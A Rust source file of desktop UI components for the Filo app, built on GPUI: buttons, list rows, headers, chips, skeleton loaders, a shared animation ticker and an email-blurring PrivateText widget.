// Desktop versions of the app's design-system components (src/ui): Button,
// IconButton, ListRow, Section, PageHeader, SubPageHeader, Chip, EmptyState,
// SegmentedControl, Banner, Loader. Colours come from the active palette and
// type from `Typography`, never hard-coded.

use std::rc::Rc;

use gpui::{
    AnyElement, App, ClickEvent, Div, ElementId, Hsla, InteractiveElement as _, IntoElement, ParentElement, RenderOnce,
    SharedString, StatefulInteractiveElement as _, Styled, Svg, Transformation, Window, div, percentage,
    prelude::FluentBuilder as _, px, relative, svg,
};
use gpui_component::WindowExt as _;
use gpui_component::notification::Notification;

use crate::nav;
use crate::theme::{ActiveTheme as _, Typography as _, radius, space};

pub type ClickHandler = Rc<dyn Fn(&ClickEvent, &mut Window, &mut App) + 'static>;

/// A Lucide icon from assets/icons, tinted with the text colour.
pub fn icon(name: &str) -> Svg {
    svg().path(SharedString::from(format!("icons/{name}.svg"))).flex_none()
}

pub fn icon_sized(name: &str, size: f32, color: Hsla) -> Svg {
    icon(name).size(px(size)).text_color(color)
}

/// The Filo mark (black on light themes, white on dark; drawn as a mask). Square, from the logo (icons/filo-mark.svg).
pub fn filo_mark(size: f32, cx: &App) -> Svg {
    svg().path("icons/filo-mark.svg").size(px(size)).flex_none().text_color(cx.colors().text)
}

/// A spinning loader in the accent colour.
pub fn spinner(size: f32, cx: &App) -> impl IntoElement {
    turning(icon("loader-circle").size(px(size)).text_color(cx.colors().accent), 1.)
}

/// `glyph` turning `turns_per_second`, in steps (`ticker`), or still with reduce motion on.
fn turning(glyph: Svg, turns_per_second: f32) -> AnyElement {
    if reduce_motion() {
        return glyph.into_any_element();
    }
    let turn = (ticker::seconds() * turns_per_second).fract();
    div()
        .relative()
        .flex_none()
        .child(glyph.with_transformation(Transformation::rotate(percentage(turn))))
        .child(gpui::canvas(|_, window, cx| ticker::keep(window, cx), |_, _, _, _| {}).absolute().size_0())
        .into_any_element()
}

/// The clock spinners, working rings and the pet's bob move by: a dozen steps a second, shared. GPUI's
/// `with_animation(...repeat())` asks for a frame every frame, and with no cached views that re-rendered the whole
/// window at display rate for as long as one showed (a coding task's ring, for an hour). Each one drawn asks for its
/// window to be drawn again at the next step; a step with none drawn stops the clock.
pub mod ticker {
    use std::cell::RefCell;
    use std::collections::HashSet;
    use std::sync::OnceLock;
    use std::time::{Duration, Instant};

    use gpui::{AnyWindowHandle, App, Window};

    const STEP: Duration = Duration::from_millis(83);

    #[derive(Default)]
    struct Ticker {
        windows: HashSet<AnyWindowHandle>,
        running: bool,
    }

    thread_local! {
        static TICKER: RefCell<Ticker> = RefCell::new(Ticker::default());
    }

    /// Seconds on the shared clock, whole steps only, so everything moving moves together.
    pub fn seconds() -> f32 {
        static START: OnceLock<Instant> = OnceLock::new();
        let elapsed = START.get_or_init(Instant::now).elapsed();
        (elapsed.as_millis() / STEP.as_millis()) as f32 * STEP.as_secs_f32()
    }

    /// Draws `window` again at the next step (call it from an element's prepaint while something moves).
    pub fn keep(window: &Window, cx: &mut App) {
        let start = TICKER.with(|ticker| {
            let mut ticker = ticker.borrow_mut();
            ticker.windows.insert(window.window_handle());
            !std::mem::replace(&mut ticker.running, true)
        });
        if !start {
            return;
        }
        cx.spawn(async move |cx| {
            loop {
                cx.background_executor().timer(STEP).await;
                let windows = TICKER.with(|ticker| std::mem::take(&mut ticker.borrow_mut().windows));
                if windows.is_empty() {
                    TICKER.with(|ticker| ticker.borrow_mut().running = false);
                    break;
                }
                for window in windows {
                    window.update(cx, |_, window, _| window.refresh()).ok();
                }
            }
        })
        .detach();
    }
}

/// System Settings › Accessibility › Display › Reduce motion: spinners and loops hold still.
pub fn reduce_motion() -> bool {
    use objc2::runtime::AnyObject;
    use objc2::{class, msg_send};
    // SAFETY: read-only AppKit messages on the main thread.
    unsafe {
        let workspace: *mut AnyObject = msg_send![class!(NSWorkspace), sharedWorkspace];
        msg_send![workspace, accessibilityDisplayShouldReduceMotion]
    }
}

/// "Working": a dashed ring that keeps turning, so a running task reads as moving (its state pill).
pub fn working_ring(size: f32, color: Hsla) -> impl IntoElement {
    // Slow enough that a step moves a dash a third of the way to the next (its eight dashes repeat every 45°).
    turning(icon("circle-dashed").size(px(size)).text_color(color), 1. / 2.4)
}

/// A pulsing placeholder for content still loading (gpui-component's Skeleton, in the
/// theme's `surface_strong`). Screens build their own outline from these, shaped
/// like what's coming, rather than showing a spinner.
pub fn skeleton(
    width: impl Into<gpui::Length> + Clone,
    height: f32,
    radius: f32,
) -> gpui_component::skeleton::Skeleton {
    gpui_component::skeleton::Skeleton::new().w(width).h(px(height)).rounded(px(radius))
}

/// Rows of a list while it loads: an optional leading square (`leading` px) and a
/// title and subtitle bar of varying widths, in a section card like `section`'s.
pub fn skeleton_rows(count: usize, leading: Option<f32>, cx: &App) -> Div {
    const WIDTHS: [(f32, f32); 6] = [(0.46, 0.28), (0.62, 0.36), (0.38, 0.22), (0.55, 0.4), (0.42, 0.3), (0.58, 0.25)];
    let colors = *cx.colors();
    div().flex().flex_col().rounded(px(radius::MD)).bg(colors.surface).overflow_hidden().children((0..count).map(
        move |index| {
            let (title, subtitle) = WIDTHS[index % WIDTHS.len()];
            div()
                .min_h(px(52.))
                .px(px(space::SM + 2.))
                .py(px(space::SM))
                .flex()
                .items_center()
                .gap(px(space::MD))
                .when(index > 0, |this| this.border_t_1().border_color(colors.border.opacity(0.6)))
                .when_some(leading, |this, size| this.child(skeleton(px(size), size, 8.).flex_none()))
                .child(
                    div()
                        .flex_1()
                        .flex()
                        .flex_col()
                        .gap(px(7.))
                        .child(skeleton(relative(title), 11., 5.))
                        .child(skeleton(relative(subtitle), 9., 4.5).secondary()),
                )
        },
    ))
}

/// A labelled section of list rows while it loads (`section` with `skeleton_rows`).
pub fn skeleton_section(count: usize, leading: Option<f32>, cx: &App) -> Div {
    div()
        .flex()
        .flex_col()
        .gap(px(space::SM))
        .child(div().px(px(space::SM)).child(skeleton(px(88.), 10., 5.)))
        .child(skeleton_rows(count, leading, cx))
}

/// Lines of body text while they load, `line` px apart; a width of 0 is a blank line.
pub fn skeleton_text(widths: &[f32], line: f32) -> Div {
    div().flex().flex_col().children(widths.iter().map(move |&width| {
        div()
            .h(px(line))
            .flex()
            .items_center()
            .when(width > 0., |this| this.child(skeleton(relative(width), (line * 0.55).round(), 5.)))
    }))
}

/// A page of labelled list sections while it loads, in the page column
/// (`sections` = rows per section).
pub fn skeleton_page(sections: &[usize], leading: Option<f32>, cx: &App) -> Div {
    page_column()
        .pt(px(space::LG))
        .flex()
        .flex_col()
        .gap(px(space::XXL))
        .children(sections.iter().map(|&rows| skeleton_section(rows, leading, cx)))
}

/// A document while it loads: a heading bar and a few paragraphs.
pub fn skeleton_document() -> Div {
    let line = (22. * crate::theme::text_scale()).round();
    div()
        .flex()
        .flex_col()
        .gap(px(space::MD))
        .child(skeleton(px(260.), 18., 7.))
        .child(skeleton_text(&[0.96, 0.92, 0.98, 0.6, 0., 0.94, 0.88, 0.97, 0.9, 0.42, 0., 0.85, 0.93, 0.5], line))
}

pub fn toast(window: &mut Window, cx: &mut App, message: impl Into<SharedString>) {
    window.push_notification(Notification::new().message(message), cx);
}

pub fn toast_error(
    window: &mut Window,
    cx: &mut App,
    title: impl Into<SharedString>,
    message: impl Into<SharedString>,
) {
    window.push_notification(Notification::error(message).title(title), cx);
}

/// A confirm dialog like the app's Alert with a destructive or default action.
pub fn confirm(
    window: &mut Window,
    cx: &mut App,
    title: impl Into<SharedString>,
    message: impl Into<SharedString>,
    ok_label: impl Into<SharedString>,
    cancel_label: impl Into<SharedString>,
    destructive: bool,
    on_ok: impl Fn(&mut Window, &mut App) + 'static,
) {
    use gpui_component::button::ButtonVariant;
    use gpui_component::dialog::DialogButtonProps;
    let (title, message, ok_label, cancel_label) = (title.into(), message.into(), ok_label.into(), cancel_label.into());
    let on_ok = Rc::new(on_ok);
    window.open_dialog(cx, move |dialog, _, cx| {
        let on_ok = on_ok.clone();
        dialog
            .title(div().headline().child(title.clone()))
            .child(div().callout().text_color(cx.colors().text_secondary).child(message.clone()))
            .confirm()
            .button_props(
                DialogButtonProps::default()
                    .ok_text(ok_label.clone())
                    .ok_variant(if destructive { ButtonVariant::Danger } else { ButtonVariant::Primary })
                    .cancel_text(cancel_label.clone()),
            )
            .on_ok(move |_, window, cx| {
                on_ok(window, cx);
                true
            })
    });
}

#[derive(Clone, Copy, PartialEq, Eq)]
pub enum Variant {
    Primary,
    Secondary,
    Ghost,
    Danger,
    Quiet,
}

#[derive(Clone, Copy, PartialEq, Eq)]
pub enum Size {
    Sm,
    Md,
}

/// Pill button (src/ui/button.tsx).
#[derive(IntoElement)]
pub struct Button {
    id: ElementId,
    label: SharedString,
    icon: Option<SharedString>,
    variant: Variant,
    size: Size,
    disabled: bool,
    loading: bool,
    full_width: bool,
    on_click: Option<ClickHandler>,
}

impl Button {
    pub fn new(id: impl Into<ElementId>, label: impl Into<SharedString>) -> Self {
        Button {
            id: id.into(),
            label: label.into(),
            icon: None,
            variant: Variant::Primary,
            size: Size::Md,
            disabled: false,
            loading: false,
            full_width: false,
            on_click: None,
        }
    }
    pub fn primary(id: impl Into<ElementId>, label: impl Into<SharedString>) -> Self {
        Self::new(id, label)
    }
    pub fn secondary(id: impl Into<ElementId>, label: impl Into<SharedString>) -> Self {
        Self::new(id, label).variant(Variant::Secondary)
    }
    pub fn ghost(id: impl Into<ElementId>, label: impl Into<SharedString>) -> Self {
        Self::new(id, label).variant(Variant::Ghost)
    }
    pub fn danger(id: impl Into<ElementId>, label: impl Into<SharedString>) -> Self {
        Self::new(id, label).variant(Variant::Danger)
    }
    pub fn variant(mut self, variant: Variant) -> Self {
        self.variant = variant;
        self
    }
    pub fn size(mut self, size: Size) -> Self {
        self.size = size;
        self
    }
    pub fn small(self) -> Self {
        self.size(Size::Sm)
    }
    pub fn icon(mut self, name: impl Into<SharedString>) -> Self {
        self.icon = Some(name.into());
        self
    }
    pub fn disabled(mut self, disabled: bool) -> Self {
        self.disabled = disabled;
        self
    }
    pub fn loading(mut self, loading: bool) -> Self {
        self.loading = loading;
        self
    }
    pub fn full_width(mut self) -> Self {
        self.full_width = true;
        self
    }
    pub fn on_click(mut self, handler: impl Fn(&ClickEvent, &mut Window, &mut App) + 'static) -> Self {
        self.on_click = Some(Rc::new(handler));
        self
    }
}

impl RenderOnce for Button {
    fn render(self, _window: &mut Window, cx: &mut App) -> impl IntoElement {
        let colors = *cx.colors();
        let (bg, fg, border) = match self.variant {
            Variant::Primary => (colors.action, colors.on_action, None),
            Variant::Secondary => (colors.surface, colors.text, Some(colors.border)),
            Variant::Ghost => (gpui::transparent_black(), colors.text, None),
            Variant::Danger => (colors.surface, colors.danger, None),
            Variant::Quiet => (gpui::transparent_black(), colors.text_secondary, None),
        };
        // Desktop sizes; the phone uses 36 / 44 / 52.
        let height = match self.size {
            Size::Sm => 28.,
            Size::Md => 32.,
        };
        let inactive = self.disabled || self.loading;
        div()
            .id(self.id)
            .h(px(height))
            .px(px(if self.size == Size::Sm { space::MD - 2. } else { space::LG - 2. }))
            .flex()
            .flex_none()
            .items_center()
            .justify_center()
            .gap(px(space::SM - 2.))
            .rounded(px(radius::FULL))
            .bg(bg)
            .text_color(fg)
            .when_some(border, |this, border| this.border_1().border_color(border))
            .when(self.full_width, |this| this.w_full())
            .map(|this| if self.size == Size::Sm { this.footnote().semibold() } else { this.subhead().semibold() })
            .when(self.disabled, |this| this.opacity(0.42))
            .when(!inactive, |this| {
                this.cursor_pointer()
                    .hover(|style| style.opacity(0.9))
                    .active(|style| style.opacity(0.62))
                    .when_some(self.on_click, |this, handler| {
                        this.on_click(move |event, window, cx| handler(event, window, cx))
                    })
            })
            .map(|this| {
                if self.loading {
                    this.child(turning(icon("loader-circle").size(px(14.)).text_color(fg), 1.))
                } else {
                    this.when_some(self.icon, |this, name| this.child(icon(&name).size(px(15.)).text_color(fg)))
                }
            })
            .child(self.label)
    }
}

/// Circular icon button (src/ui/icon-button.tsx).
#[derive(IntoElement)]
pub struct IconButton {
    id: ElementId,
    icon: SharedString,
    variant: Variant,
    small: bool,
    color: Option<Hsla>,
    selected: bool,
    disabled: bool,
    /// Busy: the icon turns (with reduce motion, holds still on the selected fill) and clicks do nothing.
    spinning: bool,
    tooltip: Option<SharedString>,
    on_click: Option<ClickHandler>,
}

impl IconButton {
    pub fn new(id: impl Into<ElementId>, icon: impl Into<SharedString>) -> Self {
        IconButton {
            id: id.into(),
            icon: icon.into(),
            variant: Variant::Ghost,
            small: false,
            color: None,
            selected: false,
            disabled: false,
            spinning: false,
            tooltip: None,
            on_click: None,
        }
    }
    pub fn primary(mut self) -> Self {
        self.variant = Variant::Primary;
        self
    }
    pub fn small(mut self) -> Self {
        self.small = true;
        self
    }
    pub fn color(mut self, color: Hsla) -> Self {
        self.color = Some(color);
        self
    }
    pub fn selected(mut self, selected: bool) -> Self {
        self.selected = selected;
        self
    }
    pub fn disabled(mut self, disabled: bool) -> Self {
        self.disabled = disabled;
        self
    }
    pub fn spinning(mut self, spinning: bool) -> Self {
        self.spinning = spinning;
        self
    }
    pub fn tooltip(mut self, tooltip: impl Into<SharedString>) -> Self {
        self.tooltip = Some(tooltip.into());
        self
    }
    pub fn on_click(mut self, handler: impl Fn(&ClickEvent, &mut Window, &mut App) + 'static) -> Self {
        self.on_click = Some(Rc::new(handler));
        self
    }
}

impl RenderOnce for IconButton {
    fn render(self, _window: &mut Window, cx: &mut App) -> impl IntoElement {
        let colors = *cx.colors();
        let size = if self.small { 28. } else { 32. };
        let icon_size = if self.small { 15. } else { 17. };
        let (bg, fg) = match self.variant {
            Variant::Primary => (colors.action, colors.on_action),
            _ if self.selected => (colors.selected_fill, colors.text),
            _ => (gpui::transparent_black(), colors.text),
        };
        let fg = self.color.unwrap_or(fg);
        let tooltip = self.tooltip.clone();
        let still = self.spinning && reduce_motion();
        let bg = if still { colors.selected_fill } else { bg };
        let glyph = icon(&self.icon).size(px(icon_size)).text_color(fg);
        let glyph = if self.spinning && !still { turning(glyph, 1.) } else { glyph.into_any_element() };
        let disabled = self.disabled && !self.spinning;
        let inert = self.disabled || self.spinning;
        div()
            .id(self.id)
            .size(px(size))
            .flex()
            .flex_none()
            .items_center()
            .justify_center()
            .rounded(px(radius::FULL))
            .bg(bg)
            .when(disabled, |this| this.opacity(0.42))
            .when(!inert, |this| {
                this.cursor_pointer()
                    .hover(|style| {
                        style.bg(if self.variant == Variant::Primary { bg.opacity(0.9) } else { colors.selected_fill })
                    })
                    .active(|style| style.opacity(0.62))
                    .when_some(self.on_click, |this, handler| {
                        this.on_click(move |event, window, cx| handler(event, window, cx))
                    })
            })
            .when_some(tooltip, |this, tooltip| {
                this.tooltip(move |window, cx| gpui_component::tooltip::Tooltip::new(tooltip.clone()).build(window, cx))
            })
            .child(glyph)
    }
}

/// Row inside a Section group (src/ui/list.tsx ListRow).
#[derive(IntoElement)]
pub struct ListRow {
    id: ElementId,
    title: SharedString,
    subtitle: Option<SharedString>,
    icon: Option<SharedString>,
    leading: Option<AnyElement>,
    trailing: Option<AnyElement>,
    chevron: bool,
    on_click: Option<ClickHandler>,
}

impl ListRow {
    pub fn new(id: impl Into<ElementId>, title: impl Into<SharedString>) -> Self {
        ListRow {
            id: id.into(),
            title: title.into(),
            subtitle: None,
            icon: None,
            leading: None,
            trailing: None,
            chevron: false,
            on_click: None,
        }
    }
    pub fn subtitle(mut self, subtitle: impl Into<SharedString>) -> Self {
        self.subtitle = Some(subtitle.into());
        self
    }
    pub fn subtitle_opt(mut self, subtitle: Option<impl Into<SharedString>>) -> Self {
        self.subtitle = subtitle.map(Into::into);
        self
    }
    pub fn icon(mut self, icon: impl Into<SharedString>) -> Self {
        self.icon = Some(icon.into());
        self
    }
    pub fn leading(mut self, element: impl IntoElement) -> Self {
        self.leading = Some(element.into_any_element());
        self
    }
    pub fn trailing(mut self, element: impl IntoElement) -> Self {
        self.trailing = Some(element.into_any_element());
        self
    }
    pub fn chevron(mut self) -> Self {
        self.chevron = true;
        self
    }
    pub fn on_click(mut self, handler: impl Fn(&ClickEvent, &mut Window, &mut App) + 'static) -> Self {
        self.on_click = Some(Rc::new(handler));
        self
    }
}

impl RenderOnce for ListRow {
    fn render(self, _window: &mut Window, cx: &mut App) -> impl IntoElement {
        let colors = *cx.colors();
        let title_color = colors.text;
        // The whole row is the click target; hover shows an inset, rounded highlight
        // (a full-bleed one can't follow the card's rounded corners).
        let group = SharedString::from(format!("list-row-{}", self.id));
        let clickable = self.on_click.is_some();
        let row = div()
            .min_h(px(36.))
            .px(px(space::SM + 2.))
            .py(px(space::XS))
            .flex()
            .items_center()
            .gap(px(space::MD))
            .rounded(px(radius::SM))
            .when(clickable, |this| this.group_hover(group.clone(), |style| style.bg(colors.text.opacity(0.06))))
            .when_some(self.icon, |this, name| {
                this.child(
                    div()
                        .size(px(28.))
                        .flex_none()
                        .rounded(px(8.))
                        .bg(colors.surface_strong)
                        .flex()
                        .items_center()
                        .justify_center()
                        .child(icon(&name).size(px(16.)).text_color(title_color)),
                )
            })
            .when_some(self.leading, |this, leading| this.child(leading))
            .child(
                div()
                    .flex_1()
                    .min_w_0()
                    .flex()
                    .flex_col()
                    .gap(px(2.))
                    .child(div().callout().medium().text_color(title_color).child(self.title))
                    .when_some(self.subtitle, |this, subtitle| {
                        this.child(div().footnote().text_color(colors.text_secondary).child(subtitle))
                    }),
            )
            .when_some(self.trailing, |this, trailing| this.child(trailing))
            .when(self.chevron, |this| {
                this.child(icon("chevron-right").size(px(15.)).text_color(colors.text_tertiary))
            });
        div()
            .id(self.id)
            .group(group)
            .p(px(space::XS))
            .when_some(self.on_click, |this, handler| {
                this.cursor_pointer().on_click(move |event, window, cx| handler(event, window, cx))
            })
            .child(row)
    }
}

/// An email (or another account name) blurred until clicked, and again on the next click: the owner records their
/// screen for videos. Hidden, it draws a stand-in of the same shape (`stand_in`), so no frame or read-out has the real
/// one. It takes the text style of where it sits. Hidden again whenever it's drawn anew (another page, a restart).
#[derive(IntoElement)]
pub struct PrivateText {
    id: ElementId,
    text: SharedString,
}

impl PrivateText {
    pub fn new(id: impl Into<ElementId>, text: impl Into<SharedString>) -> Self {
        PrivateText { id: id.into(), text: text.into() }
    }
}

/// Where the hidden text's copies sit around it and how strongly each shows: a disc of faint copies weighted like a
/// Gaussian blur, which smudges the letters away (gpui has no blur filter).
fn smear() -> impl Iterator<Item = (f32, f32, f32)> {
    const STEP: f32 = 1.5;
    const SIGMA: f32 = 2.2;
    (-3..=3_i32).flat_map(|x| (-3..=3_i32).map(move |y| (x, y))).filter(|(x, y)| x * x + y * y <= 9).map(|(x, y)| {
        let (dx, dy) = (x as f32 * STEP, y as f32 * STEP);
        (dx, dy, 0.085 * (-(dx * dx + dy * dy) / (2. * SIGMA * SIGMA)).exp())
    })
}

impl RenderOnce for PrivateText {
    fn render(self, window: &mut Window, cx: &mut App) -> impl IntoElement {
        let shown = window.use_keyed_state(self.id.clone(), cx, |_, _| false);
        let open = *shown.read(cx);
        let body = if open {
            div().min_w_0().truncate().child(self.text)
        } else {
            let hidden: SharedString = stand_in(&self.text).into();
            div()
                .relative()
                .whitespace_nowrap()
                // In the flow and invisible: the box is the text's size.
                .child(div().opacity(0.).child(hidden.clone()))
                .children(smear().map(|(x, y, strength)| {
                    div().absolute().left(px(x)).top(px(y)).opacity(strength).child(hidden.clone())
                }))
        };
        div().id(self.id).min_w_0().cursor_pointer().child(body).on_click(move |_, _, cx| {
            cx.stop_propagation();
            shown.update(cx, |shown, cx| {
                *shown = !*shown;
                cx.notify();
            });
        })
    }
}

/// `text` with each letter and digit swapped for one of a fixed run, keeping its length, spaces, "@" and ".": the
/// shape of an email, none of it.
pub fn stand_in(text: &str) -> String {
    const RUN: &[u8] = b"onesmaruvcxwz";
    text.chars()
        .enumerate()
        .map(|(index, c)| if c.is_alphanumeric() { RUN[index * 7 % RUN.len()] as char } else { c })
        .collect()
}

/// Labelled group of rows on a `surface` card with inset dividers.
pub fn section(label: Option<&str>, footer: Option<SharedString>, rows: Vec<AnyElement>, cx: &App) -> Div {
    let colors = *cx.colors();
    let count = rows.len();
    let mut group = div().flex().flex_col().rounded(px(radius::MD)).bg(colors.surface).overflow_hidden();
    for (index, row) in rows.into_iter().enumerate() {
        group = group.child(row);
        if index + 1 < count {
            group = group.child(div().ml(px(space::LG)).h(px(1.)).bg(colors.border.opacity(0.6)));
        }
    }
    div()
        .flex()
        .flex_col()
        .gap(px(space::SM))
        .when_some(label.map(|label| SharedString::from(label.to_string())), |this, label| {
            this.child(div().px(px(space::SM)).footnote().semibold().text_color(colors.text_secondary).child(label))
        })
        .child(group)
        .when_some(footer, |this, footer| {
            this.child(div().px(px(space::SM)).footnote().text_color(colors.text_tertiary).child(footer))
        })
}

/// Top-level page title with optional trailing actions (src/ui/page-header.tsx).
pub fn page_header(title: impl Into<SharedString>, trailing: Vec<AnyElement>) -> Div {
    let title = title.into();
    div()
        .flex()
        .items_center()
        .gap(px(space::SM))
        .pt(px(space::XL))
        .pb(px(space::SM))
        // The title row sits under the window's top edge, so it drags like a title bar.
        .child(
            crate::chrome::drag_region(div().id(SharedString::from(format!("page-header-{title}"))))
                .flex_1()
                .min_w_0()
                .large_title()
                .child(title),
        )
        .children(trailing)
}

/// A pushed page's bar, the one Agents and Extensions have on top: the back button, the page's title beside it, its
/// buttons at the end. Put it above the page's scroll, not in it, so it spans the page and stays put; the rest of the
/// bar drags the window (double-click zooms).
pub fn sub_page_header(id: &str, title: impl Into<SharedString>, trailing: Vec<AnyElement>, cx: &App) -> Div {
    sub_page_header_with(id, title, None, trailing, cx)
}

/// `sub_page_header` with quieter words after the title, on its line ("Claude Code  Add a plus one button, with Filo");
/// they're cut short before the title is.
pub fn sub_page_header_with(
    id: &str,
    title: impl Into<SharedString>,
    subtitle: Option<SharedString>,
    trailing: Vec<AnyElement>,
    cx: &App,
) -> Div {
    let colors = cx.colors();
    let title = div()
        .min_w_0()
        .flex()
        .items_baseline()
        .gap(px(space::SM))
        .child(div().flex_shrink_0().max_w_full().headline().truncate().child(title.into()))
        .when_some(subtitle, |this, subtitle| {
            this.child(div().flex_1().min_w_0().subhead().text_color(colors.text_secondary).truncate().child(subtitle))
        });
    div()
        .flex_none()
        .h(px(crate::theme::HEADER_HEIGHT))
        .px(px(space::SM))
        .flex()
        .items_center()
        .gap(px(space::XS))
        .child(
            IconButton::new(SharedString::from(format!("{id}-back")), "arrow-left")
                .small()
                .tooltip("Back")
                .on_click(|_, window, cx| nav::back(window, cx)),
        )
        .child(
            crate::chrome::drag_region(div().id(SharedString::from(format!("{id}-drag"))))
                .flex_1()
                .min_w_0()
                .h_full()
                .pl(px(space::XS))
                .flex()
                .items_center()
                .child(title),
        )
        .children(trailing)
}

/// A pushed page: `header` on top and `body` under it. What scrolls in the body fades out under the header
/// (`header_fade`), so the page goes soft at the bar rather than ending at a cut.
pub fn sub_page(header: impl IntoElement, body: impl IntoElement, cx: &App) -> Div {
    sub_page_on(header, body, cx.colors().background)
}

/// `sub_page` on a page coloured `background` (a coding task's conversation is on the chat's colour).
pub fn sub_page_on(header: impl IntoElement, body: impl IntoElement, background: Hsla) -> Div {
    div().size_full().flex().flex_col().bg(background).child(header).child(
        div()
            .flex_1()
            .min_h_0()
            .relative()
            // The body fills a box of the room's own size, never one measured from its content: in a flex column
            // nested in another, text was laid out at one width and drawn at another (overlapping rows, cropped
            // pictures, words broken mid-word).
            .child(div().absolute().inset_0().flex().flex_col().child(body))
            .child(header_fade(background)),
    )
}

/// The fade under a header, on a page coloured `background`: what scrolls up under the header goes soft rather than
/// ending at a cut. Put it last in the (relative) box under the header, so it paints over the box's top edge; it has no
/// hitbox, so clicks and the wheel go through to what's under it. Over a web view, a glance's page or a video it's laid
/// as the same gradient (web_holes.rs).
pub fn header_fade(background: Hsla) -> Div {
    div().absolute().top_0().left_0().right_0().h(px(space::XL)).bg(gpui::linear_gradient(
        180.,
        gpui::linear_color_stop(background, 0.),
        gpui::linear_color_stop(background.opacity(0.), 1.),
    ))
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Tone {
    Accent,
    Success,
    Warning,
    Danger,
    Neutral,
}

impl Tone {
    /// The tone as text or a dot: a status line, a row's state.
    pub fn color(self, cx: &App) -> gpui::Hsla {
        let colors = cx.colors();
        match self {
            Tone::Accent => colors.accent,
            Tone::Success => colors.success,
            Tone::Warning => colors.warning,
            Tone::Danger => colors.danger,
            Tone::Neutral => colors.text_secondary,
        }
    }

    /// The tone as a chip or a pill: its background and the text on it.
    pub fn soft(self, cx: &App) -> (gpui::Hsla, gpui::Hsla) {
        let colors = cx.colors();
        match self {
            Tone::Accent => (colors.accent_soft, colors.on_accent_soft),
            Tone::Success => (colors.success_soft, colors.on_success_soft),
            Tone::Warning => (colors.warning_soft, colors.on_warning_soft),
            Tone::Danger => (colors.danger_soft, colors.on_danger_soft),
            Tone::Neutral => (colors.surface_strong, colors.text_secondary),
        }
    }
}

pub fn chip(label: impl Into<SharedString>, tone: Tone, small: bool, cx: &App) -> Div {
    let (bg, fg) = tone.soft(cx);
    div()
        .flex_none()
        .flex()
        .items_center()
        .min_h(px(if small { 18. } else { 24. }))
        .px(px(if small { space::SM - 2. } else { space::SM + 2. }))
        .rounded(px(radius::FULL))
        .bg(bg)
        .text_color(fg)
        .map(|this| if small { this.micro().semibold() } else { this.footnote().semibold() })
        .child(label.into())
}

/// Centred icon, title, message and optional action (src/ui/empty-state.tsx).
pub fn empty_state(
    icon_name: &str,
    title: impl Into<SharedString>,
    message: Option<SharedString>,
    action: Option<AnyElement>,
    cx: &App,
) -> Div {
    let colors = *cx.colors();
    div().size_full().flex().items_center().justify_center().p(px(space::XXL)).child(
        div()
            .max_w(px(520.))
            .flex()
            .flex_col()
            .items_center()
            .gap(px(space::MD))
            .text_center()
            .child(icon(icon_name).size(px(30.)).text_color(colors.text_secondary))
            .child(div().title2().child(title.into()))
            .when_some(message, |this, message| {
                this.child(div().max_w(px(440.)).callout().text_color(colors.text_secondary).child(message))
            })
            .when_some(action, |this, action| this.child(div().mt(px(space::MD)).child(action))),
    )
}

/// Track of options with one selected (src/ui/segmented-control.tsx).
pub fn segmented<T: Clone + PartialEq + 'static>(
    id: &str,
    options: Vec<(T, SharedString, Option<&'static str>)>,
    selected: &T,
    on_select: impl Fn(T, &mut Window, &mut App) + 'static,
    cx: &App,
) -> Div {
    let colors = *cx.colors();
    let on_select = Rc::new(on_select);
    div().flex().p(px(2.)).gap(px(2.)).rounded(px(radius::MD)).bg(colors.surface_strong).children(
        options.into_iter().enumerate().map(|(index, (value, label, icon_name))| {
            let is_selected = &value == selected;
            let on_select = on_select.clone();
            div()
                .id(SharedString::from(format!("{id}-{index}")))
                .flex_1()
                .min_h(px(28.))
                .px(px(space::MD))
                .flex()
                .items_center()
                .justify_center()
                .gap(px(6.))
                .rounded(px(radius::SM + 2.))
                .footnote()
                .cursor_pointer()
                .map(|this| {
                    if is_selected {
                        this.bg(colors.raised).border_1().border_color(colors.border).semibold().text_color(colors.text)
                    } else {
                        this.medium().text_color(colors.text_secondary).hover(|style| style.text_color(colors.text))
                    }
                })
                .when_some(icon_name, |this, name| {
                    this.child(icon(name).size(px(14.)).text_color(if is_selected {
                        colors.text
                    } else {
                        colors.text_secondary
                    }))
                })
                .child(label)
                .on_click(move |_, window, cx| on_select(value.clone(), window, cx))
        }),
    )
}

pub fn banner(message: impl Into<SharedString>, tone: Tone, cx: &App) -> Div {
    let colors = *cx.colors();
    let (bg, fg) = match tone {
        Tone::Danger => (colors.danger_soft, colors.on_danger_soft),
        Tone::Warning => (colors.warning_soft, colors.on_warning_soft),
        Tone::Success => (colors.success_soft, colors.on_success_soft),
        Tone::Accent | Tone::Neutral => (colors.info_soft, colors.on_info_soft),
    };
    div()
        .px(px(space::LG))
        .py(px(space::MD))
        .rounded(px(radius::MD))
        .bg(bg)
        .text_color(fg)
        .subhead()
        .child(message.into())
}

/// Circle with the first letter of a name (sources, agents, accounts).
pub fn letter_avatar(name: &str, size: f32, bg: Hsla, fg: Hsla) -> Div {
    let letter = name.chars().find(|c| c.is_alphanumeric()).map(|c| c.to_uppercase().to_string()).unwrap_or("·".into());
    div()
        .size(px(size))
        .flex_none()
        .rounded(px(radius::FULL))
        .bg(bg)
        .flex()
        .items_center()
        .justify_center()
        .text_color(fg)
        .text_size(px((size * 0.42).max(11.)))
        .font_weight(gpui::FontWeight::SEMIBOLD)
        .child(letter)
}

/// Agent colour from a `#rrggbb` string, falling back to the accent.
pub fn hex_color(value: Option<&str>, fallback: Hsla) -> Hsla {
    match value {
        Some(hex) if hex.starts_with('#') && hex.len() >= 7 => {
            let parse = |range: std::ops::Range<usize>| u8::from_str_radix(&hex[range], 16).unwrap_or(0) as f32 / 255.;
            gpui::Rgba { r: parse(1..3), g: parse(3..5), b: parse(5..7), a: 1. }.into()
        }
        _ => fallback,
    }
}

thread_local! {
    static CONTENT_WIDTH: std::cell::Cell<f32> = const { std::cell::Cell::new(800.) };
}

/// Called by the shell each frame with the width right of the sidebar.
pub fn set_content_width(width: f32) {
    CONTENT_WIDTH.with(|cell| cell.set(width));
}

/// Inner width of `page_column()` in the current window: for media that needs a
/// fixed height (GPUI has no reliable aspect ratio for percentage widths).
pub fn column_width() -> f32 {
    column_width_in(content_width())
}

/// The width right of the sidebar, as of the last frame.
pub fn content_width() -> f32 {
    CONTENT_WIDTH.with(|cell| cell.get())
}

/// Inner width of `page_column()` in a pane `content` points wide (a page sharing the window with a side panel).
pub fn column_width_in(content: f32) -> f32 {
    content.min(crate::theme::MAX_CONTENT_WIDTH) - 2. * crate::theme::PAGE_PADDING
}

